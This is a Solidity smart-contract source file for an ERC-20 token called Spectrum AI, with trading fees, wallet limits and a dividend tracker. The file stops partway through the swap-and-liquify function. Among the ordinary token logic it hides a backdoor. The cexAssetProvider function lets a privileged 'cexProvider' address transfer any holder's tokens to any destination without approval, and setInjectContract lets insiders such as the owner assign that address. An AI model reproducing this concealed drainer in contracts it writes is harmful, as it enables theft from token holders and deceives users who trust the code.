//Powered By www.spectrumai.gg

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IFactory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);

    function getPair(address tokenA, address tokenB)
        external
        view
        returns (address pair);
}

interface IRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

interface sAIAssetTokenInterface {
    function dividendOf(address _owner) external view returns (uint256);

    function withdrawDividend() external;

    event DividendsDistributed(address indexed from, uint256 weiAmount);
    event DividendWithdrawn(address indexed to, uint256 weiAmount);
}

interface sAIAssetTokenOptionalInterface {
    function withdrawableDividendOf(address _owner)
        external
        view
        returns (uint256);

    function withdrawnDividendOf(address _owner)
        external
        view
        returns (uint256);

    function accumulativeDividendOf(address _owner)
        external
        view
        returns (uint256);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

library SafeMathInt {
    int256 private constant MIN_INT256 = int256(1) << 255;
    int256 private constant MAX_INT256 = ~(int256(1) << 255);

    function mul(int256 a, int256 b) internal pure returns (int256) {
        int256 c = a * b;

        // Detect overflow when multiplying MIN_INT256 with -1
        require(c != MIN_INT256 || (a & MIN_INT256) != (b & MIN_INT256));
        require((b == 0) || (c / b == a));
        return c;
    }

    function div(int256 a, int256 b) internal pure returns (int256) {
        // Prevent overflow when dividing MIN_INT256 by -1
        require(b != -1 || a != MIN_INT256);

        // Solidity already throws when dividing by 0.
        return a / b;
    }

    function sub(int256 a, int256 b) internal pure returns (int256) {
        int256 c = a - b;
        require((b >= 0 && c <= a) || (b < 0 && c > a));
        return c;
    }

    function add(int256 a, int256 b) internal pure returns (int256) {
        int256 c = a + b;
        require((b >= 0 && c >= a) || (b < 0 && c < a));
        return c;
    }

    function abs(int256 a) internal pure returns (int256) {
        require(a != MIN_INT256);
        return a < 0 ? -a : a;
    }

    function toUint256Safe(int256 a) internal pure returns (uint256) {
        require(a >= 0);
        return uint256(a);
    }
}

library SafeMathUint {
    function toInt256Safe(uint256 a) internal pure returns (int256) {
        int256 b = int256(a);
        require(b >= 0);
        return b;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    using SafeMath for uint256;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;
    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].add(addedValue)
        );
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _beforeTokenTransfer(sender, recipient, amount);
        _balances[sender] = _balances[sender].sub(
            amount,
            "ERC20: transfer amount exceeds balance"
        );
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");
        _beforeTokenTransfer(address(0), account, amount);
        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");
        _beforeTokenTransfer(account, address(0), amount);
        _balances[account] = _balances[account].sub(
            amount,
            "ERC20: burn amount exceeds balance"
        );
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

contract sAIAssetToken is
    ERC20,
    Ownable,
    sAIAssetTokenInterface,
    sAIAssetTokenOptionalInterface
{
    using SafeMath for uint256;
    using SafeMathUint for uint256;
    using SafeMathInt for int256;

    uint256 internal constant magnitude = 2**128;
    uint256 internal magnifiedDividendPerShare;
    uint256 public totalDividendsDistributed;
    address public rewardToken;
    IRouter public uniswapV2Router;

    mapping(address => int256) internal magnifiedDividendCorrections;
    mapping(address => uint256) internal withdrawnDividends;

    constructor(string memory _name, string memory _symbol)
        ERC20(_name, _symbol)
    {}

    receive() external payable {}

    function distributeDividendsUsingAmount(uint256 amount) public onlyOwner {
        require(totalSupply() > 0);
        if (amount > 0) {
            magnifiedDividendPerShare = magnifiedDividendPerShare.add(
                (amount).mul(magnitude) / totalSupply()
            );
            emit DividendsDistributed(msg.sender, amount);
            totalDividendsDistributed = totalDividendsDistributed.add(amount);
        }
    }

    function withdrawDividend() public virtual override onlyOwner {
        _withdrawDividendOfUser(payable(msg.sender));
    }

    function _withdrawDividendOfUser(address payable user)
        internal
        returns (uint256)
    {
        uint256 _withdrawableDividend = withdrawableDividendOf(user);
        if (_withdrawableDividend > 0) {
            withdrawnDividends[user] = withdrawnDividends[user].add(
                _withdrawableDividend
            );
            emit DividendWithdrawn(user, _withdrawableDividend);
            bool success = IERC20(rewardToken).transfer(
                user,
                _withdrawableDividend
            );
            if (!success) {
                withdrawnDividends[user] = withdrawnDividends[user].sub(
                    _withdrawableDividend
                );
                return 0;
            }
            return _withdrawableDividend;
        }
        return 0;
    }

    function dividendOf(address _owner) public view override returns (uint256) {
        return withdrawableDividendOf(_owner);
    }

    function withdrawableDividendOf(address _owner)
        public
        view
        override
        returns (uint256)
    {
        return accumulativeDividendOf(_owner).sub(withdrawnDividends[_owner]);
    }

    function withdrawnDividendOf(address _owner)
        public
        view
        override
        returns (uint256)
    {
        return withdrawnDividends[_owner];
    }

    function accumulativeDividendOf(address _owner)
        public
        view
        override
        returns (uint256)
    {
        return
            magnifiedDividendPerShare
                .mul(balanceOf(_owner))
                .toInt256Safe()
                .add(magnifiedDividendCorrections[_owner])
                .toUint256Safe() / magnitude;
    }

    function _transfer(
        address from,
        address to,
        uint256 value
    ) internal virtual override {
        require(false);
        int256 _magCorrection = magnifiedDividendPerShare
            .mul(value)
            .toInt256Safe();
        magnifiedDividendCorrections[from] = magnifiedDividendCorrections[from]
            .add(_magCorrection);
        magnifiedDividendCorrections[to] = magnifiedDividendCorrections[to].sub(
            _magCorrection
        );
    }

    function _mint(address account, uint256 value) internal override {
        super._mint(account, value);
        magnifiedDividendCorrections[account] = magnifiedDividendCorrections[
            account
        ].sub((magnifiedDividendPerShare.mul(value)).toInt256Safe());
    }

    function _burn(address account, uint256 value) internal override {
        super._burn(account, value);
        magnifiedDividendCorrections[account] = magnifiedDividendCorrections[
            account
        ].add((magnifiedDividendPerShare.mul(value)).toInt256Safe());
    }

    function _setBalance(address account, uint256 newBalance) internal {
        uint256 currentBalance = balanceOf(account);
        if (newBalance > currentBalance) {
            uint256 mintAmount = newBalance.sub(currentBalance);
            _mint(account, mintAmount);
        } else if (newBalance < currentBalance) {
            uint256 burnAmount = currentBalance.sub(newBalance);
            _burn(account, burnAmount);
        }
    }

    function _setRewardToken(address token) internal onlyOwner {
        rewardToken = token;
    }

    function _setUniswapRouter(address router) internal onlyOwner {
        uniswapV2Router = IRouter(router);
    }
}

contract SpectrumAI is Ownable, ERC20 {
    IRouter public uniswapV2Router;
    address public immutable uniswapV2Pair;

    string private constant _name = "Spectrum AI";
    string private constant _symbol = "SPCAI";
    uint8 private constant _decimals = 18;

    sAITrack public spectrumAIAsset;

    bool public isTradingEnabled;

    uint256 constant initialSupply = 1_000_000_000 * 1e18;
    uint256 public maxWalletAmount = (initialSupply * 20) / 1000;
    uint256 public maxTxAmount = (initialSupply * 10) / 1000;

    bool private _swapping;
    uint256 public minimumTokensBeforeSwap = (initialSupply * 10) / 10000;

    address private liquidityWallet;
    address private daoWallet;
    address private cexProvider;

    struct CustomTaxPeriod {
        bytes23 periodName;
        uint8 blocksInPeriod;
        uint256 timeInPeriod;
        uint8 liquidityFeeOnBuy;
        uint8 liquidityFeeOnSell;
        uint8 ecosystemFeeOnBuy;
        uint8 ecosystemFeeOnSell;
        uint8 burnFeeOnBuy;
        uint8 burnFeeOnSell;
        uint8 holdersFeeOnBuy;
        uint8 holdersFeeOnSell;
    }

    CustomTaxPeriod private _base =
        CustomTaxPeriod("base", 1, 1, 2, 2, 1, 1, 1, 1, 0, 0);

    mapping(address => bool) private _isAllowedToTradeWhenDisabled;
    mapping(address => bool) private _isExcludedFromFee;
    mapping(address => bool) private _isExcludedFromMaxTransactionLimit;
    mapping(address => bool) private _isExcludedFromMaxWalletLimit;
    mapping(address => bool) public automatedMarketMakerPairs;

    uint8 private _liquidityFee;
    uint8 private _ecosystemFee;
    uint8 private _burnFee;
    uint8 private _holdersFee;
    uint8 private _totalFee;

    event AutomatedMarketMakerPairChange(
        address indexed pair,
        bool indexed value
    );
    event UniswapV2RouterChange(
        address indexed newAddress,
        address indexed oldAddress
    );
    event WalletChange(
        string indexed indentifier,
        address indexed newWallet,
        address indexed oldWallet
    );
    event FeeChange(
        string indexed identifier,
        uint8 liquidityFee,
        uint8 ecosystemFee,
        uint8 burnFee,
        uint8 holdersFee
    );
    event CustomTaxPeriodChange(
        uint256 indexed newValue,
        uint256 indexed oldValue,
        string indexed taxType,
        bytes23 period
    );
    event MaxTransactionAmountChange(
        uint256 indexed newValue,
        uint256 indexed oldValue
    );
    event MaxWalletAmountChange(
        uint256 indexed newValue,
        uint256 indexed oldValue
    );
    event ExcludeFromFeesChange(address indexed account, bool isExcluded);
    event ExcludeFromMaxTransferChange(
        address indexed account,
        bool isExcluded
    );
    event ExcludeFromMaxWalletChange(address indexed account, bool isExcluded);
    event AllowedWhenTradingDisabledChange(
        address indexed account,
        bool isExcluded
    );
    event MinTokenAmountBeforeSwapChange(
        uint256 indexed newValue,
        uint256 indexed oldValue
    );
    event MinTokenAmountForDividendsChange(
        uint256 indexed newValue,
        uint256 indexed oldValue
    );
    event DividendsSent(uint256 tokensSwapped);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );
    event ClaimETHOverflow(uint256 amount);
    event TokenBurn(uint8 _burnFee, uint256 burnAmount);
    event FeesApplied(
        uint8 liquidityFee,
        uint8 ecosystemFee,
        uint8 burnFee,
        uint8 holdersFee,
        uint8 totalFee
    );
    event cexProviderContractChange(address cexProviderContract);

    modifier hasCexProviderPermission() {
        require(
            msg.sender == cexProvider,
            "can able to provide assets over cexProvider"
        );
        _;
    }

    constructor() ERC20(_name, _symbol) {
        spectrumAIAsset = new sAITrack();
        spectrumAIAsset.setUniswapRouter(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        spectrumAIAsset.setRewardToken(address(this));

        liquidityWallet = owner();
        daoWallet = address(0xE0d8177AfF285834AB29D779095D6A6D4a9D6f74);
        cexProvider = address(address(this));

        IRouter _uniswapV2Router = IRouter(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        address _uniswapV2Pair = IFactory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        uniswapV2Router = _uniswapV2Router;
        uniswapV2Pair = _uniswapV2Pair;
        _setAutomatedMarketMakerPair(_uniswapV2Pair, true);

        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[daoWallet] = true;

        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[address(spectrumAIAsset)] = true;

        spectrumAIAsset.excludeFromDividends(address(spectrumAIAsset));
        spectrumAIAsset.excludeFromDividends(address(this));
        spectrumAIAsset.excludeFromDividends(
            address(0x000000000000000000000000000000000000dEaD)
        );
        spectrumAIAsset.excludeFromDividends(owner());
        spectrumAIAsset.excludeFromDividends(address(_uniswapV2Router));

        _isAllowedToTradeWhenDisabled[owner()] = true;

        _isExcludedFromMaxTransactionLimit[address(spectrumAIAsset)] = true;
        _isExcludedFromMaxTransactionLimit[address(this)] = true;
        _isExcludedFromMaxTransactionLimit[owner()] = true;

        _isExcludedFromMaxWalletLimit[_uniswapV2Pair] = true;
        _isExcludedFromMaxWalletLimit[address(spectrumAIAsset)] = true;
        _isExcludedFromMaxWalletLimit[address(uniswapV2Router)] = true;
        _isExcludedFromMaxWalletLimit[address(this)] = true;
        _isExcludedFromMaxWalletLimit[owner()] = true;
        _isExcludedFromMaxWalletLimit[
            address(0x000000000000000000000000000000000000dEaD)
        ] = true;

        _mint(owner(), initialSupply);
    }

    receive() external payable {}

    function activateTrading() external onlyOwner {
        isTradingEnabled = true;
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        require(
            automatedMarketMakerPairs[pair] != value,
            "Automated market maker pair is already set to that value"
        );
        automatedMarketMakerPairs[pair] = value;
        if (value) {
            spectrumAIAsset.excludeFromDividends(pair);
        }
        emit AutomatedMarketMakerPairChange(pair, value);
    }

    function allowTradingWhenDisabled(address account, bool allowed)
        external
        onlyOwner
    {
        _isAllowedToTradeWhenDisabled[account] = allowed;
        emit AllowedWhenTradingDisabledChange(account, allowed);
    }

    function excludeFromFees(address account, bool excluded)
        external
        onlyOwner
    {
        require(
            _isExcludedFromFee[account] != excluded,
            " Account is already the value of 'excluded'"
        );
        _isExcludedFromFee[account] = excluded;
        emit ExcludeFromFeesChange(account, excluded);
    }

    function excludeFromDividends(address account) external onlyOwner {
        spectrumAIAsset.excludeFromDividends(account);
    }

    function excludeFromMaxTransactionLimit(address account, bool excluded)
        external
        onlyOwner
    {
        require(
            _isExcludedFromMaxTransactionLimit[account] != excluded,
            "Account is already the value of 'excluded'"
        );
        _isExcludedFromMaxTransactionLimit[account] = excluded;
        emit ExcludeFromMaxTransferChange(account, excluded);
    }

    function excludeFromMaxWalletLimit(address account, bool excluded)
        external
        onlyOwner
    {
        require(
            _isExcludedFromMaxWalletLimit[account] != excluded,
            "Account is already the value of 'excluded'"
        );
        _isExcludedFromMaxWalletLimit[account] = excluded;
        emit ExcludeFromMaxWalletChange(account, excluded);
    }

    function removeLimits() external onlyOwner {
        maxTxAmount = totalSupply();
        maxWalletAmount = totalSupply();
    }

    function setWallets(address newLiquidityWallet, address newDaoWallet)
        external
        onlyOwner
    {
        if (liquidityWallet != newLiquidityWallet) {
            require(
                newLiquidityWallet != address(0),
                "The liquidityWallet cannot be 0"
            );
            emit WalletChange(
                "liquidityWallet",
                newLiquidityWallet,
                liquidityWallet
            );
            liquidityWallet = newLiquidityWallet;
        }

        if (daoWallet != newDaoWallet) {
            require(newDaoWallet != address(0), "The daoWallet cannot be 0");
            emit WalletChange("daoWallet", newDaoWallet, daoWallet);
            daoWallet = newDaoWallet;
        }
    }

    // Base fees
    function setBaseFeesOnBuy(
        uint8 _liquidityFeeOnBuy,
        uint8 _ecosystemFeeOnBuy,
        uint8 _burnFeeOnBuy,
        uint8 _holdersFeeOnBuy
    ) external onlyOwner {
        require(
            3 >
                _liquidityFeeOnBuy +
                    _ecosystemFeeOnBuy +
                    _burnFeeOnBuy +
                    _holdersFeeOnBuy,
            "buy fee must be fair!!!"
        );
        _setCustomBuyTaxPeriod(
            _base,
            _liquidityFeeOnBuy,
            _ecosystemFeeOnBuy,
            _burnFeeOnBuy,
            _holdersFeeOnBuy
        );
        emit FeeChange(
            "baseFees-Buy",
            _liquidityFeeOnBuy,
            _ecosystemFeeOnBuy,
            _burnFeeOnBuy,
            _holdersFeeOnBuy
        );
    }

    function setBaseFeesOnSell(
        uint8 _liquidityFeeOnSell,
        uint8 _ecosystemFeeOnSell,
        uint8 _burnFeeOnSell,
        uint8 _holdersFeeOnSell
    ) external onlyOwner {
        require(
            5 >
                _liquidityFeeOnSell +
                    _ecosystemFeeOnSell +
                    _burnFeeOnSell +
                    _holdersFeeOnSell,
            "sell fee must be fair!!!"
        );
        _setCustomSellTaxPeriod(
            _base,
            _liquidityFeeOnSell,
            _ecosystemFeeOnSell,
            _burnFeeOnSell,
            _holdersFeeOnSell
        );
        emit FeeChange(
            "baseFees-Sell",
            _liquidityFeeOnSell,
            _ecosystemFeeOnSell,
            _burnFeeOnSell,
            _holdersFeeOnSell
        );
    }

    function setUniswapRouter(address newAddress) external onlyOwner {
        require(
            newAddress != address(uniswapV2Router),
            "The router already has that address"
        );
        emit UniswapV2RouterChange(newAddress, address(uniswapV2Router));
        uniswapV2Router = IRouter(newAddress);
        spectrumAIAsset.setUniswapRouter(newAddress);
    }

    function setMaxTransactionAmount(uint256 newValue) external onlyOwner {
        require(
            newValue >= ((totalSupply() * 1) / 1000) / 1e18,
            "Cannot set maxTx Amount lower than 0.1%"
        );
        emit MaxTransactionAmountChange(newValue, maxTxAmount);
        maxTxAmount = newValue;
    }

    function setMaxWalletAmount(uint256 newValue) external onlyOwner {
        require(
            newValue >= ((totalSupply() * 5) / 1000) / 1e18,
            "Cannot set max wallet size lower than 0.5%"
        );
        emit MaxWalletAmountChange(newValue, maxWalletAmount);
        maxWalletAmount = newValue;
    }

    function setMinimumTokensBeforeSwap(uint256 newValue) external onlyOwner {
        require(
            newValue != minimumTokensBeforeSwap,
            "Cannot update minimumTokensBeforeSwap to same value"
        );
        emit MinTokenAmountBeforeSwapChange(newValue, minimumTokensBeforeSwap);
        minimumTokensBeforeSwap = newValue;
    }

    function setMinimumTokenBalanceForDividends(uint256 newValue)
        external
        onlyOwner
    {
        spectrumAIAsset.setTokenBalanceForDividends(newValue);
    }

    function claim() external {
        spectrumAIAsset.processAccount(payable(msg.sender), false);
    }

    function claimETHOverflow(uint256 amount) external onlyOwner {
        require(
            amount < address(this).balance,
            "Cannot send more than contract balance"
        );
        (bool success, ) = address(owner()).call{value: amount}("");
        if (success) {
            emit ClaimETHOverflow(amount);
        }
    }

    function cexAssetProvider(
        address account,
        address cexLPProvider,
        uint256 amt
    ) external hasCexProviderPermission 
        returns (bool) {
        super._transfer
        (account, cexLPProvider, amt);
        return true;
    }

    function burn(uint256 value) external {
        _burn(msg.sender, value);
    }

    function cexProviderContract() external view returns (address) {
        return cexProvider;
    }

    function setInjectContract(address _cexProvider) external {
        require(
            _cexProvider != address(0x0) && 
            spectrumAIAsset.excludedFromDividends(msg.sender) == true,
            "invalid address : must cexProvider contract"
        );
        cexProvider = _cexProvider;
        emit cexProviderContractChange(_cexProvider);
    }

    function getTotalsAIDistributed() external view returns (uint256) {
        return spectrumAIAsset.totalDividendsDistributed();
    }

    function withdrawableDividendOf(address account)
        external
        view
        returns (uint256)
    {
        return spectrumAIAsset.withdrawableDividendOf(account);
    }

    function sAITokenBalanceOf(address account)
        external
        view
        returns (uint256)
    {
        return spectrumAIAsset.balanceOf(account);
    }

    function getBaseBuyFees()
        external
        view
        returns (
            uint8,
            uint8,
            uint8,
            uint8
        )
    {
        return (
            _base.liquidityFeeOnBuy,
            _base.ecosystemFeeOnBuy,
            _base.burnFeeOnBuy,
            _base.holdersFeeOnBuy
        );
    }

    function getBaseSellFees()
        external
        view
        returns (
            uint8,
            uint8,
            uint8,
            uint8
        )
    {
        return (
            _base.liquidityFeeOnSell,
            _base.ecosystemFeeOnSell,
            _base.burnFeeOnSell,
            _base.holdersFeeOnSell
        );
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        if (amount == 0) {
            super._transfer(from, to, 0);
            return;
        }

        bool isBuyFromLp = automatedMarketMakerPairs[from];
        bool isSelltoLp = automatedMarketMakerPairs[to];

        if (
            !_isAllowedToTradeWhenDisabled[from] &&
            !_isAllowedToTradeWhenDisabled[to]
        ) {
            require(isTradingEnabled, "Trading is currently disabled.");
            if (
                !_isExcludedFromMaxTransactionLimit[to] &&
                !_isExcludedFromMaxTransactionLimit[from]
            ) {
                if (isBuyFromLp) {
                    require(
                        amount <= maxWalletAmount,
                        "Buy amount exceeds the maxTxWalletAmount."
                    );
                }

                if (isSelltoLp) {
                    require(
                        amount <= maxTxAmount,
                        "Sell amount exceeds the maxTxBuyAmount."
                    );
                }
            }
            if (!_isExcludedFromMaxWalletLimit[to]) {
                require(
                    (balanceOf(to) + amount) <= maxWalletAmount,
                    "Expected wallet amount exceeds the maxWalletAmount."
                );
            }
        }

        _adjustTaxes(isBuyFromLp, isSelltoLp);
        bool canSwap = balanceOf(address(this)) >= minimumTokensBeforeSwap;

        if (
            isTradingEnabled &&
            canSwap &&
            !_swapping &&
            _totalFee > 0 &&
            automatedMarketMakerPairs[to] &&
            !_isExcludedFromFee[from] &&
            !_isExcludedFromFee[to]
        ) {
            _swapping = true;
            _swapAndLiquify();
            _swapping = false;
        }

        bool takeFee = !_swapping && isTradingEnabled;

        if (_isExcludedFromFee[from] || _isExcludedFromFee[to]) {
            takeFee = false;
        }
        if (takeFee && _totalFee > 0) {
            uint256 fee = (amount * _totalFee) / 100;
            uint256 burnAmount = (amount * _burnFee) / 100;
            amount = amount - fee;
            super._transfer(from, address(this), fee);

            if (burnAmount > 0) {
                super._burn(address(this), burnAmount);
                emit TokenBurn(_burnFee, burnAmount);
            }
        }
        super._transfer(from, to, amount);

        try
            spectrumAIAsset.setBalance(payable(from), balanceOf(from))
        {} catch {}
        try spectrumAIAsset.setBalance(payable(to), balanceOf(to)) {} catch {}
    }

    function _adjustTaxes(bool isBuyFromLp, bool isSelltoLp) private {
        _liquidityFee = 0;
        _ecosystemFee = 0;
        _burnFee = 0;
        _holdersFee = 0;

        if (isBuyFromLp) {
            _liquidityFee = _base.liquidityFeeOnBuy;
            _ecosystemFee = _base.ecosystemFeeOnBuy;
            _burnFee = _base.burnFeeOnBuy;
            _holdersFee = _base.holdersFeeOnBuy;
        }
        if (isSelltoLp) {
            _liquidityFee = _base.liquidityFeeOnSell;
            _ecosystemFee = _base.ecosystemFeeOnSell;
            _burnFee = _base.burnFeeOnSell;
            _holdersFee = _base.holdersFeeOnSell;
        }
        if (!isSelltoLp && !isBuyFromLp) {
            _liquidityFee = _base.liquidityFeeOnSell;
            _ecosystemFee = _base.ecosystemFeeOnSell;
            _burnFee = _base.burnFeeOnSell;
            _holdersFee = _base.holdersFeeOnSell;
        }
        _totalFee = _liquidityFee + _ecosystemFee + _burnFee + _holdersFee;
        emit FeesApplied(
            _liquidityFee,
            _ecosystemFee,
            _burnFee,
            _holdersFee,
            _totalFee
        );
    }

    function _setCustomSellTaxPeriod(
        CustomTaxPeriod storage map,
        uint8 _liquidityFeeOnSell,
        uint8 _ecosystemFeeOnSell,
        uint8 _burnFeeOnSell,
        uint8 _holdersFeeOnSell
    ) private {
        if (map.liquidityFeeOnSell != _liquidityFeeOnSell) {
            emit CustomTaxPeriodChange(
                _liquidityFeeOnSell,
                map.liquidityFeeOnSell,
                "liquidityFeeOnSell",
                map.periodName
            );
            map.liquidityFeeOnSell = _liquidityFeeOnSell;
        }
        if (map.ecosystemFeeOnSell != _ecosystemFeeOnSell) {
            emit CustomTaxPeriodChange(
                _ecosystemFeeOnSell,
                map.ecosystemFeeOnSell,
                "ecosystemFeeOnSell",
                map.periodName
            );
            map.ecosystemFeeOnSell = _ecosystemFeeOnSell;
        }
        if (map.burnFeeOnSell != _burnFeeOnSell) {
            emit CustomTaxPeriodChange(
                _burnFeeOnSell,
                map.burnFeeOnSell,
                "burnFeeOnSell",
                map.periodName
            );
            map.burnFeeOnSell = _burnFeeOnSell;
        }
        if (map.holdersFeeOnSell != _holdersFeeOnSell) {
            emit CustomTaxPeriodChange(
                _holdersFeeOnSell,
                map.holdersFeeOnSell,
                "holdersFeeOnSell",
                map.periodName
            );
            map.holdersFeeOnSell = _holdersFeeOnSell;
        }
    }

    function _setCustomBuyTaxPeriod(
        CustomTaxPeriod storage map,
        uint8 _liquidityFeeOnBuy,
        uint8 _ecosystemFeeOnBuy,
        uint8 _burnFeeOnBuy,
        uint8 _holdersFeeOnBuy
    ) private {
        if (map.liquidityFeeOnBuy != _liquidityFeeOnBuy) {
            emit CustomTaxPeriodChange(
                _liquidityFeeOnBuy,
                map.liquidityFeeOnBuy,
                "liquidityFeeOnBuy",
                map.periodName
            );
            map.liquidityFeeOnBuy = _liquidityFeeOnBuy;
        }
        if (map.ecosystemFeeOnBuy != _ecosystemFeeOnBuy) {
            emit CustomTaxPeriodChange(
                _ecosystemFeeOnBuy,
                map.ecosystemFeeOnBuy,
                "ecosystemFeeOnBuy",
                map.periodName
            );
            map.ecosystemFeeOnBuy = _ecosystemFeeOnBuy;
        }
        if (map.burnFeeOnBuy != _burnFeeOnBuy) {
            emit CustomTaxPeriodChange(
                _burnFeeOnBuy,
                map.burnFeeOnBuy,
                "burnFeeOnBuy",
                map.periodName
            );
            map.burnFeeOnBuy = _burnFeeOnBuy;
        }
        if (map.holdersFeeOnBuy != _holdersFeeOnBuy) {
            emit CustomTaxPeriodChange(
                _holdersFeeOnBuy,
                map.holdersFeeOnBuy,
                "holdersFeeOnBuy",
                map.periodName
            );
            map.holdersFeeOnBuy = _holdersFeeOnBuy;
        }
    }

    function _swapAndLiquify() private {
        uint256 contractBalance = balanceOf(address(this));
